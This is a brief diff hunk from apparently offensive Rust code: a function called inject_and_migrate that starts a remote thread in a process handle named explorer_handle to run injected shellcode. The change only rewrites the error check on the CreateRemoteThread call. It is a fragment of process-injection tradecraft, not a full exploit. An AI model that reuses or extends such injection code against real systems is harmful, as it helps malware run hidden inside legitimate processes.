@@ -68,7 +68,7 @@ pub fn inject_and_migrate(shellcode: &[u8], target_process: &str) {
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/fn.CreateRemoteThread.html
     let start_address_option = unsafe { Some(mem::transmute(base_address)) };
-    if let Err(_) = unsafe { CreateRemoteThread(explorer_handle, ptr::null(), 0, start_address_option, ptr::null(), 0, ptr::null_mut()) } {
+    if unsafe { CreateRemoteThread(explorer_handle, ptr::null(), 0, start_address_option, ptr::null(), 0, ptr::null_mut()) }.is_err() {
         panic!("CreateRemoteThread failed");
     }
 }
